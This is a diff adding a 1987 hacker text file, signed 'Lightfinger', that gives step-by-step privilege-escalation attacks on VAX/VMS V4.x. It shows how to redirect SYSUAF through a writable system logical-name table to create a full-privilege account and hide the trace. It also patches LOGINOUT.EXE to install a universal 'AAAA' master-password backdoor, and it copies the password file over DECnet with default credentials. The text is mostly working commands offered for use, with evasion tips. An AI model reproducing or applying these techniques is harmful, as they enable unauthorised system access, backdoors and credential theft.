@@ -1,0 +1,125 @@
+
+1.  To get SYSNAM privilege under V4.2 do the following:-
+
+
+
+$ SET ACL/OBJ=LOGICAL/ACL=(ID=[???,???],ACCESS=READ+WRITE+DELETE+CONTROL)
+      LNM$SYSTEM_TABLE
+
+
+
+etc. on all there tables that you need access to.  The problem with VMS is
+that it allows ACLs on logical name tables, but anyone can put them on!
+[???,???] is your UIC.
+
+ Or if you have another method of gaining SYSNAM priv you can do the 
+following..
+
+Now that you have this ACL, you should be able to add an entry for SYSUAF,
+you need the executor mode name, eg:
+
+
+
+$ DEFINE/SYSTEM/EXEC SYSUAF $1$DISK1:[FRED]SYSUAF
+
+If you have done a SET DEFAULT to [FRED] before hand and done this:
+
+$ COPY SYS$SYSTEM:SYSUAF.DAT *
+
+then you should be able to do:
+
+$ RUN SYS$SYSTEM:AUTHORIZE
+
+UAF>ADD FRED/PASS=FRED/PRIV=ALL/FLAG=NODISUSER
+
+UAF>^Z
+
+*EXIT*
+
+ You should now note that ANYONE logging onto the system will be checked
+against the SYSUAF file in the [FRED] directory and NOT the SYS$SYSTEM 
+directory.. also anyone doing a SHOW LOGICAL will see a new entry in the 
+system name table.. ie. "SYSUAF" = SYS$SYSDEVICE:[FRED]SYSUAF
+
+Its now all ready to test..
+Try:
+
+$ SET HOST 0
+
+Username: FRED
+Password: FRED
+
+And hey presto.. your logged in with FULL privileges..
+
+As entering an entry into the System logical table is a bit of a mass 
+giveaway of who is hacking the system it is a good idea to copy the sysuaf
+file from the system direcxtory, and ALTERING your OWN account to have
+full privs, doing this doesnt cause suspicsion if a new USERNAME appears.
+
+So write a DCL command procedure that will:
+A. Get SYSNAM priv
+B. Enter the new logical name into the system table
+C. Login
+
+and write a routine that is called from your login.com file that does:
+
+A. Checks for the SYSUAF entry in the system table
+B. Deletes it if it is present.
+
+Doing this will make the new definition for SYSUAF only appear for a fract-
+ion of a second and will be very dificult to trace..
+
+You should now be logged into your own account with FULL privs.. magic
+really.. (I have tested this method and it works really well!)
+
+
+2.   Another approach (or extension to the last method) by  getting  write
+     access to LOGINOUT.EXE in SYS$SYSTEM is the following patch:
+
+$SET DEFAULT SYS$SYSTEM:
+$PATCH LOGINOUT
+
+PATCH>REPALCE/INSTRUCTION 9D14
+
+OLD>'MOVAB B^20(SP),B^1C(SP)'
+OLD>EXIT
+NEW>'CMPL B^20(SP),#41414141'
+NEW>'BNEQ LBL'
+NEW>'MOVL I^#1,R0'
+NEW>'RET'
+NEW>'LBL: MOVAB B^20(SP),B^1C(SP)'
+NEW>EXIT
+PATCH>UPDATE
+
+$ INSTALL/REPLACE LOGINOUT.EXE
+$ PURGE LOGINOUT.EXE
+
+Then try logging in:
+
+Username: SYSTEM
+Password: AAAA
+
+or
+
+Username: ANY_ONE_WHO_EXISTS_ON_THIS_SYSTEM
+Password: AAAA
+
+This works for V4.2 and V4.3, probably V4.1 as well, check if the MOVAB is
+at 9D14 with EXAMIN/INSTRUCTION.
+
+3. On most machines you will find the following also works, (useful for 
+   accessing protected files..)
+
+  To say copy the SYSUAF.DAT file to your own directory try:
+
+ $ COPY NODE"DECNET DECNET"::SYS$SYSTEM:SYSUAF.DAT *.*
+
+ Where NODE is your local node name (machine name, can be found by doing
+ SHOW NETWORK, the current node is the top one in the list)
+ If the above doesnt work then try removing the second DECNET within the 
+ quotes.
+ The two words within the quotes are firstly the username and secondly the
+ password of an account that has NETWORK access, DECNET is likely to have
+ full access on most machines.
+
+          These hacks are copyright of Lightfinger.     (c) 1987
